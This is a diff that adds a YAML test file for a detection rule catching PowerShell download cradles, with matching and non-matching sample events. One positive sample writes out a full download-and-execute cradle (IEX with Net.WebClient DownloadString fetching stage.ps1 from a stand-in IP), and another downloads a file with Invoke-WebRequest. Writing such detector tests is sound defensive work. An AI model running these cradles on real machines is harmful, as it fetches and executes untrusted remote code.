@@ -1,0 +1,24 @@
+tests:
+  - name: detects a WebClient download cradle
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell.exe -nop -c "IEX ((New-Object Net.WebClient).DownloadString(''http://198.51.100.10/stage.ps1''))"'
+    expected: true
+
+  - name: detects Invoke-WebRequest in PowerShell 7
+    event:
+      Image: 'C:\Program Files\PowerShell\7\pwsh.exe'
+      CommandLine: 'pwsh.exe -c "Invoke-WebRequest http://198.51.100.10/a.zip -OutFile a.zip"'
+    expected: true
+
+  - name: ignores PowerShell without a download primitive
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell.exe Get-Service | Where-Object Status -eq Running'
+    expected: false
+
+  - name: ignores a download primitive in a non-PowerShell process
+    event:
+      Image: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'cmd.exe /c echo Invoke-WebRequest'
+    expected: false
